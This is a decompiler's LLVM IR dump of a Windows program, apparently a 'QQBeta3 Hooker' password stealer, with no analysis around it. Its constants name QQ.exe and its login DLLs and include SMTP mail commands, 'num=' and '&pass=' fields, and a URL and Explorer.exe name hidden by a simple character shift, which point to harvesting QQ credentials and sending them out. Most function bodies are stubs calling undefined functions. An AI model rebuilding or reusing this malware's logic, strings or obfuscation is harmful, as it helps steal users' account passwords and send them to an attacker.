source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_406604 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406610 = constant i32 47
@global_var_406650 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_40665c = constant [5 x i8] c"num=\00"
@global_var_40666c = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_40667c = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0nzrr0ofx=btq\00"
@global_var_406754 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406764 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406874 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406884 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_40688c = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406b00 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406b14 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406b20 = local_unnamed_addr constant i32 47
@global_var_40690c = local_unnamed_addr constant i32 4221200
@global_var_406910 = local_unnamed_addr constant i32 841875985
@global_var_406c40 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406c54 = constant i32 47
@global_var_406c60 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_407238 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_4072e4 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_40746c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_407478 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_407958 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40797c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_407a10 = constant [11 x i8] c"user32.dll\00"
@global_var_407a1c = constant [11 x i8] c"LoadImageA\00"
@global_var_407a28 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407608 = local_unnamed_addr constant i32 4224596
@global_var_407654 = local_unnamed_addr constant i32 1867011080
@global_var_407a38 = constant [12 x i8] c"LoadStringA\00"
@global_var_407a44 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_407a50 = constant [12 x i8] c"shell32.dll\00"
@global_var_407a5c = constant [14 x i8] c"ShellExecuteA\00"
@global_var_407a6c = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_407af0 = local_unnamed_addr constant [40 x i8] c"skddrfgrgerergwederthdrhjdhrdrhdjalksjd\00"
@global_var_4096f8 = local_unnamed_addr global i32 0
@global_var_4096fc = global i32 0
@global_var_407bd0 = local_unnamed_addr constant i32 31
@global_var_409810 = local_unnamed_addr global i32 0
@global_var_409814 = local_unnamed_addr global i32 0
@global_var_40980c = local_unnamed_addr global i32 0
@global_var_407f88 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409808 = local_unnamed_addr global i32 0
@global_var_407f98 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407fb0 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407fc8 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407fd8 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407fe8 = constant [8 x i8] c"ListBox\00"
@global_var_409818 = global i32 0
@global_var_407ff8 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_409700 = external global i8*

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
